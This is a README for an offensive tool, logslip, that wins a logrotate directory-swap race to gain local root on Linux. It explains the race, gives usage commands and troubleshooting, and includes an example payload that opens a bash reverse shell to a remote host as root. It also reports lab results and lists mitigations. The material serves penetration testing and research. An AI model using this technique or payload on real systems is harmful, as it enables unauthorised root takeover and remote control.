# logslip - logrotate directory-swap race for local root

`logrotate` runs as root and rotates a log an unprivileged user owns. It renames
the log and then recreates it, and in the gap between those two steps the
directory the log lives in can be swapped for a symlink, so root creates the new
file wherever the symlink points. Dropped into `/etc/bash_completion.d`, that
file runs as root on the next interactive root login.

This is the race Wolfgang Hotwagner found and automated in
[logrotten](https://github.com/whotwagner/logrotten). The bug is his. logslip is
a rewrite with a single atomic swap, a busy-spin reactor, and a payload write
that actually lands and is verified, plus a `--probe` mode that tells you whether
a target is exploitable before you fire at it.

It is a local privilege-escalation technique, not a CVE. The vulnerability lives
in whatever ships the insecure logrotate setup; the canonical real-world
instance is CVE-2019-10143 (FreeRADIUS).

## The race

With a `create` config, logrotate rotates like this:

```c
rename("dir/access.log", "dir/access.log.1");
/* a couple of microseconds */
createOutputFile("dir/access.log", O_CREAT | O_EXCL | O_NOFOLLOW);
```

`O_NOFOLLOW` guards only the final path component, `access.log`. It does nothing
for the *directory* component. If the attacker replaces `dir` with a symlink to a
root-owned directory in the window between the two calls, the create resolves
through the symlink and root writes the new log into the target directory, owned
per the `create` directive's arguments.

logslip swaps the directory with one `renameat2(RENAME_EXCHANGE)` on a
pre-opened parent fd, where logrotten does `rename()` then `symlink()`. The
two-syscall swap has its own window in which the log directory does not exist;
lose there and logrotten leaves a dangling symlink that breaks every later
attempt. The exchange is atomic and reversible, so the tree is always consistent.

Catching the window is reactive and tight. logslip busy-spins on a non-blocking
inotify fd rather than blocking on `read()`: the gap is shorter than a scheduler
wakeup, so a reader that sleeps wakes after the create and loses. On a win it
swaps the directory back at once and then writes the payload to the now-stable
target, retrying across root's `create`->`fchown` window and reading it back to
confirm. logrotten sleeps a fixed `-s` interval, writes blind, and exits silently
on either failure; logslip reports win, loss, or exactly why it could not land.

## Usage

```bash
gcc -O2 -Wall -Wextra -o logslip logslip.c      # or: make

./logslip --probe /home/user/backups/access.log   # is it exploitable, and how?
./logslip -p payload /home/user/backups/access.log # race it
```

Point it at the log an attacker-owned directory holds, the one root's logrotate
rotates. `--probe` watches one rotation and reports the mode, the period, and
whether the recreated file comes back writable, so you know the shape before
committing. Then run it with a payload and wait; it keeps attempting until it
wins or `-a` runs out.

A payload is a shell fragment sourced as root. Guard it so it only fires for
root and, ideally, removes itself:

```bash
cat > payload <<'EOF'
if [ "$(id -u)" = 0 ]; then
    rm -f /etc/bash_completion.d/access.log
    (bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &)
fi
EOF
```

The guard matters: files in `/etc/bash_completion.d` are sourced by *every*
interactive login bash, your own included, so an unguarded reverse shell hangs
your shell before it ever reaches root's.

### Options

```
-p, --payload <file>    file whose contents are dropped as root
-t, --targetdir <dir>   directory to hijack (default /etc/bash_completion.d)
-a, --attempts <n>      attempts before giving up, 0 = forever (default 40)
-d, --decoys <n>        optional early-warning decoy rotated files (default 0)
-T, --trigger           append to the log each attempt to force a rotation
-w, --wait <ms>         window to wait for root's create (default 400)
    --probe             detect rotation mode / period / writability and exit
-q, --quiet             only print the outcome
-h, --help              this help
```

`-T` keeps the log non-empty so `notifempty` configs rotate it; leave it off if
root's own driver already fills the log. `-d` exists but defaults off: the
decoys are an early-warning lever that did not help measurably under the
busy-spin loop. The target directory and payload-file path have the usual
meaning from logrotten.

## Requirements

A C compiler on the target, or build elsewhere for the same architecture. Linux,
`renameat2(RENAME_EXCHANGE)` (3.15+), and inotify. No non-standard libraries.

## When it does not work

- **`no rotation within window`** - root is not rotating the log. The usual
  cause is the log's directory being group- or world-writable: root's logrotate
  refuses a log in an insecure directory and skips it silently. The directory is
  yours, so set it back to `0755`; logslip does this itself at startup. Also
  check the log is non-empty (`notifempty`) and that root's cron actually runs
  logrotate on this path.
- **`file created but not attacker-writable`** - you won the swap, but the
  `create` directive makes the new file root-owned, so the payload write is
  refused. `--probe` reports this up front.
- **copytruncate** - no rename happens, so the directory-swap race does not
  apply. `--probe` names the mode.
- **compress** - the file root creates is the `.gz`, not the log, so `-p` does
  not deliver a runnable payload; you get an arbitrary `.gz` write instead.
- **`su` directive present** - logrotate drops to the log's owner before
  rotating, so root never creates the file and there is nothing to hijack. This
  is also the fix.

## Results

Measured on the Hack The Box "Linux Local Privilege Escalation" logrotate lab,
Ubuntu 20.04, 2 CPUs, root running `logrotate -f` on a `create` config every
~5 seconds, 16 November 2026.

End to end, against `/etc/bash_completion.d`:

```
[+] WON on attempt 13 - dropped 132 bytes to /etc/bash_completion.d/access.log
$ cat /tmp/proof            # written by the payload on root's next login
uid=0(root) gid=0(root) groups=0(root)
```

Head to head against logrotten, 25 single-rotation trials each, a `0555`
dropzone so only root can create the file:

| tool | wins |
|---|---|
| logrotten | 0 / 25 |
| logslip | 2 / 25 |

Both are low, and at this sample size the per-attempt edge is within noise. The
win is scheduler-bound: `rename` and `create` are consecutive syscalls, so you
only win when root is preempted in the microsecond gap between them, which no
userspace tool can force. CPU saturation to provoke preemption was tried and
**backfired** (0 / 25) - the burners starve logslip's own spinner. In practice
you run with many attempts and it lands within ~1-2 minutes, which is how it got
the `uid=0` above. logslip's real gains over logrotten are the atomic swap that
never corrupts the tree and the write that actually delivers the payload, not a
different order of win rate.

## Affected setups

| Field | Value |
|---|---|
| Class | logrotate rename->create directory-swap race (CWE-362, TOCTOU) |
| Technique | Wolfgang Hotwagner, logrotten |
| Canonical instances | CVE-2019-10143 (FreeRADIUS), CVE-2016-1247 (Debian nginx) |
| Preconditions | attacker-owned log directory, not group/world-writable; root-run logrotate with `create`; no `su` directive |
| Target written | any directory root can reach, e.g. `/etc/bash_completion.d`, `/etc/cron.d` |
| Mitigation | `su <user> <group>` in the config; root-owned non-writable log dirs; SELinux or AppArmor |

There is no logrotate CVE for this; the program is behaving as configured. The
CVEs are against the applications that ship the insecure setup.

## Origin

| Role | Who |
|---|---|
| **Technique and first PoC** | [Wolfgang Hotwagner](https://github.com/whotwagner/logrotten), logrotten |
| **Canonical real-world instance** | CVE-2019-10143 (FreeRADIUS); CVE-2016-1247 (Dawid Golunski, Debian nginx) |
| **This implementation** | [d4ytox](https://github.com/d4ytox) |

The race is not mine. The rewrite - the atomic swap, the busy-spin reactor, the
verified write, and `--probe` - is.

## References

- [Wolfgang Hotwagner, "Abusing a race condition in logrotate to elevate privileges"](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
- [whotwagner/logrotten](https://github.com/whotwagner/logrotten) - the original PoC
- [NVD - CVE-2019-10143](https://nvd.nist.gov/vuln/detail/CVE-2019-10143) - FreeRADIUS, the canonical instance
- [NVD - CVE-2016-1247](https://nvd.nist.gov/vuln/detail/CVE-2016-1247) - Debian nginx, Dawid Golunski
- [logrotate(8)](https://man7.org/linux/man-pages/man8/logrotate.8.html) - the `su` directive and the insecure-directory check
- [renameat2(2)](https://man7.org/linux/man-pages/man2/rename.2.html) - `RENAME_EXCHANGE`

## Licence

MIT, see [LICENSE](LICENSE). The grant covers this implementation. The race
condition is Hotwagner's research, credited in the file header and the Origin
table, and this is not a relicensing of logrotten.

## Legal

For authorised testing and research only. This drops a file that executes as
root on the target. Running it against a system you do not own, or do not have
written permission to test, is illegal in most places. Clean up what you drop:
the payload path is printed on a win, and the example payload removes itself.
